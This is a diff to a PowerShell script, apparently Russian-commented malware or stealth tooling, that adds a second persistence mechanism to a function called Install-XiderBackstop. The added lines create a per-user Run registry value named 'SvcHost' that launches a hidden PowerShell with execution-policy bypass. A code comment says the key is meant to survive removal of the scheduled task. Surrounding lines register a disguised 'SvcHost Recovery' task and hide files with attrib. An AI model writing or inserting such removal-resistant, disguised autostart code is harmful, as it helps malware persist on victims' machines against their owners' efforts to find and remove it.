@@ -96,6 +96,18 @@ function Install-XiderBackstop {
         Register-ScheduledTask -TaskName 'SvcHost Recovery' -Action $action -Trigger @($logonTrigger, $repeatTrigger) `
             -Settings $settings -Principal $principal -Description 'SvcHost recovery backstop' -Force | Out-Null
 
+        # Second, independent trigger: the per-user Run key survives deletion of
+        # the scheduled task and starts the same hidden backstop at logon.
+        try {
+            $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+            New-Item -Path $runKey -Force | Out-Null
+            New-ItemProperty -Path $runKey -Name 'SvcHost' `
+                -Value ('powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $backstop) `
+                -PropertyType String -Force | Out-Null
+        } catch {
+            Write-Warning ("Не удалось добавить автозапуск в реестр: {0}" -f $_.Exception.Message)
+        }
+
         if (Get-Command attrib.exe -ErrorAction SilentlyContinue) {
             & attrib.exe +h +s /s /d $mirror | Out-Null
         }
